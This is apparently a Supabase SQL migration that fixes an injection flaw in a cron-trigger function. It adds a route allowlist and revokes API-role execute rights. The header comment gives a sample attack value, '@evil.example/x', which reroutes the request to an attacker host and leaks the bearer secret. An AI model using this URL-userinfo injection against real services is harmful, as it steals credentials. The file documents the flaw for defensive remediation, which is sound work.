-- Hardens public.trigger_cron_route, which was SECURITY DEFINER, executable by
-- anon/authenticated via PostgREST RPC, and concatenated a caller-supplied
-- route_path onto the Vault base URL with no validation.
--
-- URL parsing treats everything before an '@' in the authority as userinfo, so
-- route_path = '@evil.example/x' turned 'https://<app>' into
-- 'https://<app>@evil.example/x' -- host evil.example. That is unauthenticated
-- exfiltration of the cron bearer secret (sent in the Authorization header) to
-- a caller-controlled server, plus arbitrary triggering of the sync and insight
-- jobs. Confirmed with the WHATWG URL parser before changing anything.
--
-- NOTE ON HISTORY: these two statements were applied directly to the live
-- project on 2026-08-27 with the user's explicit approval, before this file
-- existed. The file exists so a project provisioned from supabase/migrations
-- does not recreate the vulnerable function -- it reproduces exactly what is
-- live today (verified against pg_get_functiondef and proacl), and re-running
-- it against the live project is a no-op.
--
-- Safe to re-run: `create or replace` and `revoke` are both idempotent.

-- 1. Reject any route_path that is not one of this app's own cron routes.
--    Everything else is byte-for-byte the definition from
--    20260715160000_add_dead_letter_status_and_retry_sweep.sql.
create or replace function public.trigger_cron_route(route_path text)
returns void
language plpgsql
security definer
set search_path = public, extensions, vault
as $$
declare
  v_bearer_secret text;
  v_base_url text;
  v_request_id bigint;
begin
  if route_path !~ '^/api/cron/[a-z0-9-]+$' then
    raise exception 'trigger_cron_route: refusing unrecognized route_path %', route_path;
  end if;

  select decrypted_secret into v_bearer_secret
  from vault.decrypted_secrets
  where name = 'cron_bearer_secret'
  limit 1;

  select decrypted_secret into v_base_url
  from vault.decrypted_secrets
  where name = 'cron_target_base_url'
  limit 1;

  if v_bearer_secret is null or v_base_url is null then
    raise warning
      'trigger_cron_route(%): missing vault secret(s) cron_bearer_secret / cron_target_base_url — run the one-time vault.create_secret(...) setup (see migration header comment). Skipping.',
      route_path;
    return;
  end if;

  select net.http_post(
    url := v_base_url || route_path,
    headers := jsonb_build_object(
      'Authorization', 'Bearer ' || v_bearer_secret,
      'Content-Type', 'application/json'
    ),
    body := '{}'::jsonb,
    timeout_milliseconds := 25000
  ) into v_request_id;
end;
$$;

comment on function public.trigger_cron_route(text) is
  'Reads cron_bearer_secret / cron_target_base_url from Supabase Vault at call time and POSTs to <base_url><route_path> via pg_net. route_path is restricted to ^/api/cron/[a-z0-9-]+$ so a caller cannot escape the base URL. EXECUTE is revoked from anon/authenticated: only the owner (postgres, which is what the pg_cron jobs run as) and service_role may call it.';

-- 2. Take EXECUTE away from the API roles. `create or replace function` does
--    not reset an existing function's ACL, so this must run every time.
--    Safe because both cron.job entries run as postgres, which retains EXECUTE
--    as owner, and no application code calls this RPC (both verified).
--    To undo: grant execute on function public.trigger_cron_route(text)
--             to anon, authenticated;
revoke execute on function public.trigger_cron_route(text) from public;
revoke execute on function public.trigger_cron_route(text) from anon;
revoke execute on function public.trigger_cron_route(text) from authenticated;
